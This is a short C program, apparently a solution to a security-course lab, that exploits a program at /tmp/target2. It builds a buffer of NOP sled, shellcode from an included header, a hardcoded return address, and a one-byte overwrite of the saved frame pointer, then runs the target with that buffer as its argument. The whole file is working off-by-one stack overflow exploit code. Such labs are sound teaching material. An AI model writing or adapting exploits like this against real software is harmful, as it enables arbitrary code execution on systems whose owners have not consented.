#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  // buf to target bar function in target2
  char buf[242];
  // adress of the local variable buf in bar function
  int addr;
  addr = 0xbffffc88;

  int i;
  for(i = 0; i < 240; i++) {
    if(i < (236 - strlen(shellcode))) {
      *(buf + i) = '\x90'; // add nop
    } else if(i < 236) {
      *(buf + i) = shellcode[i - 236 + strlen(shellcode)]; // add shellcode
    } else if(i < 240) {
      *(buf + i) = addr >> ((i - 236) * 8); // make fake ret
    } 
  }
  *(buf + 240) = '\x70'; // change byte in ebp
  *(buf + 241) = '\x00'; // add null

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
